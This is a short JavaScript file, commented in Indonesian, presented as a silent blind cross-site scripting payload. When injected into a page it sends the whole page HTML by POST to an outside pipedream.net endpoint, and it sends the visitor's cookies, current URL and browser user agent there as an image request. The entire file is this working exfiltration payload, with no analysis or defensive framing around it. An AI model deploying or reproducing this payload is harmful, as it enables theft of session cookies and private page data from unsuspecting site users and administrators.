// stealth.js — Silent BXSS payload
(function () {
  const endpoint = "https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net";

  // Kirim seluruh dokumen (DOM) ke endpoint
  fetch(endpoint, {
    method: "POST",
    mode: "no-cors",
    body: document.documentElement.outerHTML
  });

  // Atau kirim data penting ringan
  new Image().src = endpoint + "?c=" + encodeURIComponent(document.cookie) +
    "&l=" + encodeURIComponent(location.href) +
    "&u=" + encodeURIComponent(navigator.userAgent);
})();
